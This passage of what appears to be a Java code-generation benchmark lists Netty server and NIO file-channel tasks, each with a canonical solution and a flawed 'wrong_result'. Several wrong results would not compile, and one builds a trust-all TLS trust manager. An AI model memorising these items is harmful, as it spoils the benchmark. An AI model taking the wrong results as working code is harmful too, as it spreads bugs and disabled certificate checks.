    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class DiscardServer {\n\n    private int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8080;\n        new DiscardServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class DiscardServer {\n    private final int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new DiscardHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_REUSEADDR, true)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new DiscardServer(port).run();\n    }\n}\n\npublic class DiscardHandler extends ChannelInboundHandlerAdapter {\n    @Override\n    public void channelRead(ChannelHandlerContext ctx, Object msg) {\n        ((ByteBuf) msg).release();\n    }\n\n    @Override\n    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n        cause.printStackTrace();\n        ctx.close();\n    }\n}"
  },
  {
    "Task_id": 169,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles incoming client connections and processes requests using a RESTful service configuration.\n\nClass Description: NettyRestfulService is a final class that implements a RestfulService interface, providing functionality to start and stop a Netty TCP server with configurable host and port settings. It uses Netty's NIO event loop groups for efficient connection handling and includes proper resource cleanup during shutdown.\n\nAttributes:\n- DEFAULT_WORKER_GROUP_THREADS: [int] - Default number of worker threads calculated based on available processors\n- config: [NettyRestfulServiceConfiguration] - Configuration object containing host and port settings\n- serverBootstrap: [ServerBootstrap] - Netty server bootstrap instance for server configuration\n- bossEventLoopGroup: [EventLoopGroup] - Netty event loop group for accepting connections\n- workerEventLoopGroup: [EventLoopGroup] - Netty event loop group for handling I/O operations\n\nMethods:\n- initServerBootstrap() -> [void] - Initializes the server bootstrap with event loop groups, channel type, and pipeline handlers\n- startup() -> [void] - Starts the server by binding to the configured host and port, logs success/failure\n- shutdown() -> [void] - Gracefully shuts down the server by closing event loop groups and releasing resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.NettyRuntime;\nimport lombok.RequiredArgsConstructor;\nimport lombok.SneakyThrows;\nimport lombok.extern.slf4j.Slf4j;\nimport org.apache.shardingsphere.elasticjob.restful.pipeline.RestfulServiceChannelInitializer;\n\n@RequiredArgsConstructor\n@Slf4j\npublic final class NettyRestfulService implements RestfulService {\n\n    private static final int DEFAULT_WORKER_GROUP_THREADS = 1 + 2 * NettyRuntime.availableProcessors();\n\n    private final NettyRestfulServiceConfiguration config;\n\n    private ServerBootstrap serverBootstrap;\n\n    private EventLoopGroup bossEventLoopGroup;\n\n    private EventLoopGroup workerEventLoopGroup;\n\n    private void initServerBootstrap() {\n        bossEventLoopGroup = new NioEventLoopGroup();\n        workerEventLoopGroup = new NioEventLoopGroup(DEFAULT_WORKER_GROUP_THREADS);\n        serverBootstrap = new ServerBootstrap()\n                .group(bossEventLoopGroup, workerEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new RestfulServiceChannelInitializer(config));\n    }\n\n    @SneakyThrows(InterruptedException.class)\n    @Override\n    public void startup() {\n        initServerBootstrap();\n        ChannelFuture channelFuture = serverBootstrap.bind(config.getHost(), config.getPort());\n        channelFuture.addListener(future -> {\n            if (future.isSuccess()) {\n                log.info(\"Restful Service started on port {}.\", config.getPort());\n            } else {\n                log.error(\"Failed to start Restful Service.\", future.cause());\n            }\n        }).sync();\n    }\n\n    @Override\n    public void shutdown() {\n        bossEventLoopGroup.shutdownGracefully();\n        workerEventLoopGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public final class NettyRestfulService implements RestfulService {\n    private static final int DEFAULT_WORKER_GROUP_THREADS = Math.min(4, Runtime.getRuntime().availableProcessors());\n    private final NettyRestfulServiceConfiguration config;\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossEventLoopGroup;\n    private final EventLoopGroup workerEventLoopGroup;\n\n    public NettyRestfulService(NettyRestfulServiceConfiguration config) {\n        this.config = config;\n        this.bossEventLoopGroup = new NioEventLoopGroup();\n        this.workerEventLoopGroup = new NioEventLoopGroup(DEFAULT_WORKER_GROUP_THREADS);\n        this.serverBootstrap = new ServerBootstrap();\n        initServerBootstrap();\n    }\n\n    private void initServerBootstrap() {\n        serverBootstrap.group(bossEventLoopGroup, workerEventLoopGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new HttpServerCodec());\n                        ch.pipeline().addLast(new HttpRequestDecoder());\n                        ch.pipeline().addLast(new HttpResponseEncoder());\n                        ch.pipeline().addLast(new RestfulRequestHandler());\n                    }\n                });\n    }\n\n    public void startup() {\n        try {\n            serverBootstrap.bind(config.getHost(), config.getPort()).sync();\n            System.out.println(\"Server started on \" + config.getHost() + \":\" + config.getPort());\n        } catch (Exception e) {\n            System.err.println(\"Failed to start server: \" + e.getMessage());\n        }\n    }\n\n    public void shutdown() {\n        try {\n            bossEventLoopGroup.shutdownGracefully();\n            workerEventLoopGroup.shutdownGracefully();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 17,
    "Instruction": "Task Description: Create a Java class that provides file channel operations using Java NIO's FileChannel for efficient file I/O operations, including reading, writing, positioning, truncating, and memory mapping.\n\nClass Description: TranslogFileChannel is a wrapper class for FileChannel that simplifies file operations while maintaining the performance benefits of Java NIO. It implements Closeable to ensure proper resource cleanup.\n\nAttributes:\n- location: Path - The file path associated with the FileChannel\n- channel: FileChannel - The underlying FileChannel instance for performing I/O operations\n\nMethods:\n- TranslogFileChannel(Path location) -> void - Constructor that opens a FileChannel for both reading and writing at the specified path\n- write(ByteBuffer src) -> void - Writes data from the given ByteBuffer to the file\n- read(ByteBuffer dst) -> int - Reads data from the file into the given ByteBuffer, returning the number of bytes read\n- position() -> long - Returns the current position in the file\n- position(long newPosition) -> void - Sets the position in the file\n- size() -> long - Returns the current size of the file\n- truncate(long size) -> void - Truncates the file to the specified size\n- force(boolean metaData) -> void - Forces any updates to be written to the storage device\n- transferTo(long position, long count, WritableByteChannel target) -> long - Transfers bytes from this channel to the given writable channel\n- transferFrom(ReadableByteChannel src, long position, long count) -> long - Transfers bytes into this channel from the given readable channel\n- map(FileChannel.MapMode mode, long position, long size) -> MappedByteBuffer - Maps a region of this channel's file directly into memory\n- close() -> void - Closes the FileChannel and releases associated resources",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class TranslogFileChannel implements Closeable {\n\n    private final Path location;\n    private FileChannel channel;\n\n    public TranslogFileChannel(Path location) throws IOException {\n        this.location = location;\n        this.channel = FileChannel.open(location, StandardOpenOption.READ, StandardOpenOption.WRITE);\n    }\n\n    public void write(ByteBuffer src) throws IOException {\n        channel.write(src);\n    }\n\n    public int read(ByteBuffer dst) throws IOException {\n        return channel.read(dst);\n    }\n\n    public long position() throws IOException {\n        return channel.position();\n    }\n\n    public void position(long newPosition) throws IOException {\n        channel.position(newPosition);\n    }\n\n    public long size() throws IOException {\n        return channel.size();\n    }\n\n    public void truncate(long size) throws IOException {\n        channel.truncate(size);\n    }\n\n    public void force(boolean metaData) throws IOException {\n        channel.force(metaData);\n    }\n\n    public long transferTo(long position, long count, WritableByteChannel target) throws IOException {\n        return channel.transferTo(position, count, target);\n    }\n\n    public long transferFrom(ReadableByteChannel src, long position, long count) throws IOException {\n        return channel.transferFrom(src, position, count);\n    }\n\n    public MappedByteBuffer map(MapMode mode, long position, long size) throws IOException {\n        return channel.map(mode, position, size);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class TranslogFileChannel implements Closeable {\n    private final Path location;\n    private final FileChannel channel;\n\n    public TranslogFileChannel(Path location) throws IOException {\n        this.location = location;\n        this.channel = FileChannel.open(location, StandardOpenOption.READ, StandardOpenOption.WRITE);\n    }\n\n    public void write(ByteBuffer src) throws IOException {\n        channel.write(src);\n    }\n\n    public int read(ByteBuffer dst) throws IOException {\n        return channel.read(dst);\n    }\n\n    public long position() throws IOException {\n        return channel.position();\n    }\n\n    public void position(long newPosition) throws IOException {\n        channel.position(newPosition);\n    }\n\n    public long size() throws IOException {\n        return channel.size();\n    }\n\n    public void truncate(long size) throws IOException {\n        channel.truncate(size);\n    }\n\n    public void force(boolean metaData) throws IOException {\n        channel.force(metaData);\n    }\n\n    public long transferTo(long position, long count, WritableByteChannel target) throws IOException {\n        return channel.transferTo(position, count, target);\n    }\n\n    public long transferFrom(ReadableByteChannel src, long position, long count) throws IOException {\n        return channel.transferFrom(src, position, count);\n    }\n\n    public MappedByteBuffer map(FileChannel.MapMode mode, long position, long size) throws IOException {\n        return channel.map(mode, position, size);\n    }\n\n    @Override\n    public void close() throws IOException {\n        if (channel != null) {\n            channel.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with optional SSL encryption.\n\nClass Description: The HttpSnoopServer class is a Netty-based HTTP server that can operate in both secure (HTTPS) and non-secure (HTTP) modes. It uses a boss-worker thread model for handling connections and includes SSL support through self-signed certificates when enabled.\n\nAttributes:\n- SSL: static final boolean - Determines whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: static final int - The port number the server will listen on (configured via system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- start(): void - Starts the HTTP server with the configured settings. Throws Exception if server startup fails.\n  - Initializes SSL context if enabled\n  - Sets up boss and worker event loop groups\n  - Configures server bootstrap with channel type and handlers\n  - Binds to specified port and starts accepting connections\n  - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpSnoopServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpSnoopServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class HttpSnoopServer {\n    public static final boolean SSL = Boolean.getBoolean(\"ssl\");\n    public static final int PORT = Integer.getInteger(\"port\", SSL ? 8443 : 8080);\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup);\n            b.channel(NioServerSocketChannel.class);\n\n            SslContext sslCtx = null;\n            if (SSL) {\n                KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"RSA\");\n                kpg.initialize(2048);\n                KeyPair keyPair = kpg.generateKey();\n\n                sslCtx = SslContextBuilder.forServer(keyPair, keyPair)\n                    .trustManager(new X509TrustManager() {\n                        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                    })\n                    .build();\n            }\n\n            b.childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                protected void initChannel(SocketChannel ch) {\n                    ChannelPipeline p = ch.pipeline();\n                    if (sslCtx != null) {\n                        p.addLast(sslCtx.newHandler(ch.alloc()));\n                    }\n                    p.addLast(new HttpServerHandler());\n                }\n            });\n\n            ChannelFuture future = b.bind(PORT).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    static class HttpServerHandler extends SimpleChannelInboundHandler<FullHttpRequest> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest req) {\n            System.out.println(\"Received HTTP request: \" + req.uri());\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n            FullHttpResponse resp = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK);\n            resp.content().writeBytes(response.getBytes(StandardCharsets.UTF_8));\n            ctx.write(resp);\n            ctx.flush();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 175,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling multiple client connections with configurable channel handlers.\n\nClass Description: MockTcpServer is a Netty-based TCP server implementation that provides flexible handler configuration and proper resource management. It uses NIO event loop groups for efficient connection handling and includes graceful shutdown capabilities.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles the traffic of accepted connections\n- channel: [Channel] - Represents the server's listening channel\n- handlers: [List<Supplier<? extends ChannelHandler>>] - List of handler suppliers for processing incoming data\n\nMethods:\n- addHandler(Supplier<? extends ChannelHandler> supplier) -> [void] - Adds a channel handler supplier to the pipeline configuration\n- initialize(int port) -> [void] throws InterruptedException - Starts the server on specified port and initializes all configured handlers\n- shutdown() -> [void] - Closes the server channel and triggers graceful shutdown of event loops\n- Resources (static inner class) -> [NioEventLoopGroup] - Manages shared event loop groups and shutdown hooks for resource cleanup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.DefaultThreadFactory;\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.function.Supplier;\n\npublic class MockTcpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        bossGroup = Resources.bossGroup;\n        workerGroup = Resources.workerGroup;\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .option(ChannelOption.SO_BACKLOG, 100)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) {\n                 ChannelPipeline p = ch.pipeline();\n                 for (Supplier<? extends ChannelHandler> handler : handlers) {\n                     p.addLast(handler.get());\n                 }\n             }\n         });\n\n        ChannelFuture f = b.bind(port).sync();\n        channel = f.channel();\n    }\n\n    public void shutdown() {\n        channel.close();\n    }\n\n    private static class Resources {\n        private static final EventLoopGroup bossGroup;\n        private static final EventLoopGroup workerGroup;\n\n        static {\n            bossGroup = new NioEventLoopGroup(1, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n            workerGroup = new NioEventLoopGroup(5, new DefaultThreadFactory(NioEventLoopGroup.class, true));\n\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                bossGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n                workerGroup.shutdownGracefully(0, 0, TimeUnit.MILLISECONDS);\n            }, \"MockRedisServer-shutdown\"));\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class MockTcpServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private Channel channel;\n    private List<Supplier<? extends ChannelHandler>> handlers;\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        this.handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workerGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<Channel>() {\n             @Override\n             protected void initChannel(Channel ch) throws Exception {\n                 ChannelPipeline pipeline = ch.pipeline();\n                 for (Supplier<? extends ChannelHandler> handler : handlers) {\n                     ChannelHandler handlerInstance = handler.get();\n                     pipeline.addLast(handlerInstance);\n                 }\n             }\n         });\n        channel = b.bind(port).sync();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close().awaitUninterruptibly();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static class Resources {\n        private static final EventLoopGroup BOSS_GROUP = new NioEventLoopGroup();\n        private static final EventLoopGroup WORKER_GROUP = new NioEventLoopGroup();\n\n        static {\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                BOSS_GROUP.shutdownGracefully();\n                WORKER_GROUP.shutdownGracefully();\n            }));\n        }\n\n        public static EventLoopGroup getBossGroup() {\n            return BOSS_GROUP;\n        }\n\n        public static EventLoopGroup getWorkerGroup() {\n            return WORKER_GROUP;\n        }\n    }\n}"
  },
  {
    "Task_id": 179,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and manage heartbeat detection.\n\nClass Description: The HeartbeatServer class is a Netty-based TCP server that listens for incoming connections on a specified port, manages client connections using boss and worker event loop groups, and includes proper startup and shutdown procedures.\n\nAttributes:\n- PORT: [static final int] - The port number on which the server will listen for connections\n- bossGroup: [EventLoopGroup] - The parent event loop group that accepts incoming connections\n- workerGroup: [EventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- bootstrap: [ServerBootstrap] - The server configuration object that binds the server components together\n\nMethods:\n- HeartbeatServer() -> [constructor] - Initializes the server components including event loop groups and server bootstrap\n- start() throws Exception -> [void] - Configures and starts the server, binds to the specified port, and begins accepting connections\n- stop() -> [void] - Shuts down the server gracefully by closing all event loop groups",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class HeartbeatServer {\n    static final int PORT = 8082;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public HeartbeatServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .handler(new LoggingHandler(LogLevel.INFO))\n                     .childHandler(new HeartbeatHandlerInitializer());\n\n            ChannelFuture f = bootstrap.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class HeartbeatServer {\n    public static final int PORT = 8080;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final ServerBootstrap bootstrap;\n\n    public HeartbeatServer() {\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HeartbeatHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childOption(ChannelOption.SO_REUSEADDR, true);\n    }\n\n    public void start() throws Exception {\n        bootstrap.bind(PORT).sync();\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}"
  },
  {
    "Task_id": 18,
    "Instruction": "Task Description: Implement an asynchronous file handling class in Java using NIO's AsynchronousFileChannel for non-blocking file operations, supporting both reading and writing with various file opening options.\n\nClass Description: AsyncFileImpl is an implementation of AsyncFile interface that provides asynchronous file operations using Java NIO. It handles file reading, writing, and closing operations in a non-blocking manner, with support for various file opening modes and permissions.\n\nAttributes:\n- vertx: VertxInternal - The Vert.x instance for asynchronous operations\n- ch: AsynchronousFileChannel - The NIO asynchronous file channel\n- context: ContextInternal - The Vert.x context for operation execution\n- closed: boolean - Flag indicating if the file is closed\n- writePos: long - Current write position in the file\n- readBufferSize: int - Size of the read buffer (default 8192)\n- handler: Handler<Buffer> - Handler for read operations\n- endHandler: Handler<Void> - Handler for end of file operations\n- readPos: long - Current read position in the file\n- readLength: long - Maximum length to read (default Long.MAX_VALUE)\n\nMethods:\n- AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) -> [Constructor] - Initializes the file channel with specified path and options\n- close() -> Future<Void> - Closes the file channel and releases resources\n- read(Buffer buffer, int offset, long position, int length) -> Future<Buffer> - Reads data from file into buffer at specified position\n- write(Buffer buffer, long position) -> Future<Void> - Writes buffer content to file at specified position\n- doWrite(Buffer buffer, long position, Handler<AsyncResult<Void>> handler) -> void - Internal method for write operation\n- doWrite(ByteBuffer[] buffers, long position, Handler<AsyncResult<Void>> handler) -> void - Internal method for writing multiple buffers\n- doWrite(ByteBuffer buff, long position, long toWrite, Handler<AsyncResult<Void>> handler) -> void - Internal method for writing buffer content\n- writeInternal(ByteBuffer buff, long position, Handler<AsyncResult<Void>> handler) -> void - Core write implementation using CompletionHandler\n- doRead(Buffer writeBuff, int offset, ByteBuffer buff, long position, Promise<Buffer> promise) -> void - Internal method for read operation\n- check() -> void - Verifies if file is not closed\n- closeInternal(Promise<Void> handler) -> void - Internal method for closing the file channel",
    "Canonical_solution": "import io.vertx.core.AsyncResult;\nimport io.vertx.core.Future;\nimport io.vertx.core.Handler;\nimport io.vertx.core.Promise;\nimport io.vertx.core.buffer.Buffer;\nimport io.vertx.core.internal.buffer.BufferInternal;\nimport io.vertx.core.file.AsyncFile;\nimport io.vertx.core.file.FileSystemException;\nimport io.vertx.core.file.OpenOptions;\nimport io.vertx.core.impl.Arguments;\nimport io.vertx.core.internal.ContextInternal;\nimport io.vertx.core.internal.VertxInternal;\nimport io.vertx.core.internal.logging.Logger;\nimport io.vertx.core.internal.logging.LoggerFactory;\nimport io.vertx.core.streams.impl.InboundBuffer;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.AsynchronousFileChannel;\nimport java.nio.channels.CompletionHandler;\nimport java.nio.file.OpenOption;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.file.attribute.FileAttribute;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.HashSet;\nimport java.util.Objects;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class AsyncFileImpl implements AsyncFile {\n\n    private static final Logger log = LoggerFactory.getLogger(AsyncFile.class);\n\n    private final VertxInternal vertx;\n    private final AsynchronousFileChannel ch;\n    private final ContextInternal context;\n    private boolean closed;\n    private long writePos;\n    private int readBufferSize = 8192;\n    private Handler<Buffer> handler;\n    private Handler<Void> endHandler;\n    private long readPos;\n    private long readLength = Long.MAX_VALUE;\n\n    public AsyncFileImpl(VertxInternal vertx, String path, OpenOptions options, ContextInternal context) {\n        this.vertx = vertx;\n        Path file = Paths.get(path);\n        HashSet<OpenOption> opts = new HashSet<>();\n        if (options.isRead()) opts.add(StandardOpenOption.READ);\n        if (options.isWrite()) opts.add(StandardOpenOption.WRITE);\n        if (options.isCreate()) opts.add(StandardOpenOption.CREATE);\n        if (options.isCreateNew()) opts.add(StandardOpenOption.CREATE_NEW);\n        if (options.isSync()) opts.add(StandardOpenOption.SYNC);\n        if (options.isDsync()) opts.add(StandardOpenOption.DSYNC);\n        if (options.isDeleteOnClose()) opts.add(StandardOpenOption.DELETE_ON_CLOSE);\n        if (options.isSparse()) opts.add(StandardOpenOption.SPARSE);\n        if (options.isTruncateExisting()) opts.add(StandardOpenOption.TRUNCATE_EXISTING);\n        try {\n            if (options.getPerms() != null) {\n                FileAttribute<?> attrs = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString(options.getPerms()));\n                ch = AsynchronousFileChannel.open(file, opts, vertx.getWorkerPool().executor(), attrs);\n            } else {\n                ch = AsynchronousFileChannel.open(file, opts, vertx.getWorkerPool().executor());\n            }\n            if (options.isAppend()) writePos = ch.size();\n        } catch (IOException e) {\n            throw new FileSystemException(e);\n        }\n        this.context = context;\n    }\n\n    @Override\n    public Future<Void> close() {\n        Promise<Void> promise = context.promise();\n        closeInternal(promise);\n        return promise.future();\n    }\n\n    @Override\n    public Future<Buffer> read(Buffer buffer, int offset, long position, int length) {\n        Promise<Buffer> promise = context.promise();\n        Objects.requireNonNull(buffer, \"buffer\");\n        Arguments.require(offset >= 0, \"offset must be >= 0\");\n        Arguments.require(position >= 0, \"position must be >= 0\");\n        Arguments.require(length >= 0, \"length must be >= 0\");\n        check();\n        ByteBuffer bb = ByteBuffer.allocate(length);\n        doRead(buffer, offset, bb, position, promise);\n        return promise.future();\n    }\n\n    @Override\n    public Future<Void> write(Buffer buffer, long position) {\n        Promise<Void> promise = context.promise();\n        doWrite(buffer, position, promise::handle);\n        return promise.future();\n    }\n\n    private void doWrite(Buffer buffer, long position, Handler<AsyncResult<Void>> handler) {\n        Objects.requireNonNull(buffer, \"buffer\");\n        Arguments.require(position >= 0, \"position must be >= 0\");\n        check();\n        ByteBuf buf = ((BufferInternal)buffer).getByteBuf();\n        if (buf.nioBufferCount() > 1) {\n            doWrite(buf.nioBuffers(), position, handler);\n        } else {\n            ByteBuffer bb = buf.nioBuffer();\n            doWrite(bb, position, bb.limit(), handler);\n        }\n    }\n\n    private void doWrite(ByteBuffer[] 